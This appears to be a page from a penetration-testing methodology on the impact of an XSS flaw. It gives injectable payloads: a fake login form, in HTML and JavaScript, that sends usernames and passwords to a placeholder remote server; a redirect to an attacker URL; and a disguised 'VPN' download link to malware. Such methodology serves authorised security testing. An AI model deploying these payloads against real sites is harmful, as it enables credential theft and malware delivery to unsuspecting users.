If you could not successfully achieve any of the other Impact Techniques, a last option is to embed malicious content into the frontend. 

This Impact Technique has one step:
1. Embed malicious content into the frontend

# 1. Embed malicious content
Use your XSS payload to insert a login form into the frontend, redirect the user, or perform some other undesirable behavior. 

If you can generate unfiltered HTML, you may consider the following login form:
```html
<form action="<BURP-COLLABORATOR-URL" method="post">
  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
  </div>
</form>
```

If you can only insert JavaScript, the following code will automatically add the above `<form>` to the document object model:
~~~javascript
var loginForm = `<form action="BURP-COLLABORATOR-URL" method="post">
  <div class="container">
    <label for="uname"><b>Username</b></label>
    <input type="text" placeholder="Enter Username" name="uname" required>

    <label for="psw"><b>Password</b></label>
    <input type="password" placeholder="Enter Password" name="psw" required>

    <button type="submit">Login</button>
  </div>
</form>`;

html = document.getElementsByTagName("html")[0]; // change as needed
html.insertAdjacentHTML("beforeend", loginForm);
~~~
- Replace `BURP-COLLABORATOR-URL` with the URL of your remote server.
- This code will append the login form to the bottom of the page. This may not be desirable. If not, select a different element with `getElementsByTagName` to use instead. 
	- `insertAdjacentHTML` will insert the `loginForm` as an HTML child element of the calling object (in this case, `<html>`). 


The above example embeds a login form into the web page. Here are some other ideas:


**Redirect the user**
```javascript
window.location = "SERVER-URL";
```
- Replace `SERVER-URL` with a link to an external server that the attacker might wish to redirect users to. 


**Download a file**
```javascript
var loginForm = `<a href=SERVER-URL>Click to download the VPN</a>`;

html = document.getElementsByTagName("html")[0]; // change as needed
html.insertAdjacentHTML("beforeend", loginForm);
```
- Replace `SERVER-URL` with a link to a server hosting "malware".